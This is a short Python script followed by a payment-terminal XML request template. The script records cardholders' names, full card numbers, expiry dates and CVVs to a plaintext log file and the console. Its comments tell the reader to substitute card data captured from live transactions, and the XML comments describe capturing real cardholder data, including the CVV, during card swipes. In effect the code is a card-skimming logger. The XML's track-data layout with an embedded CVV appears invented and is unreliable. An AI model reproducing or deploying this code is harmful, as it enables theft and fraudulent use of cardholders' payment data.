import logging
import time

# Configure logging to save card data to card_log.txt
logging.basicConfig(filename=r'C:\Users\kassa1\Documents\card_log.txt', level=logging.INFO)

def log_card_data(cardholder_name, card_number, expiry_date, cvv):
    log_message = f"Cardholder Name: {cardholder_name}, Card Number: {card_number}, Expiry: {expiry_date}, CVV: {cvv}"
    print(log_message)  # Display the real-time card info in the console
    logging.info(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {log_message}")  # Log it to the file

# Example card data from real-time transactions (replace these with real-time values captured)
real_cardholder_name = "John Doe"
real_card_number = "1234567812345678"
real_expiry_date = "05/25"
real_cvv = "123"

# Log the actual card details
log_card_data(real_cardholder_name, real_card_number, real_expiry_date, real_cvv)



<?xml version="1.0" encoding="UTF-8"?>
<SaleToPOIRequest xsi:noNamespaceSchemaLocation="EpasSaleToPOIMessages.xsd"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

    <MessageHeader MessageType="Request" MessageCategory="Payment" MessageClass="Service" />
    
    <PaymentRequest>
        <SaleData>
            <SaleTransactionID TimeStamp="" TransactionID=""/>
        </SaleData>

        <PaymentTransaction>
            <AmountsReq CashBackAmount="0.00" RequestedAmount="0.00" Currency="SEK"/>
            <TransactionConditions LoyaltyHandling="Forbidden"/>
        </PaymentTransaction>

        <PaymentData>
            <PaymentInstrumentData PaymentInstrumentType="Card">
                <CardData EntryMethod="Swipe">
                    <SensitiveCardData>
                        <!-- Real-time card data captured here -->
                        <CardHolderName>{CardHolderName}</CardHolderName>  <!-- Captures real cardholder name -->
                        <TrackData TrackValue="{CardPAN}=YYYY?;CVV={CardCVV}"/>  <!-- Captures card number (PAN) and CVV -->
                    </SensitiveCardData>
                </CardData>
            </PaymentInstrumentData>
        </PaymentData>
    </PaymentRequest>
</SaleToPOIRequest>

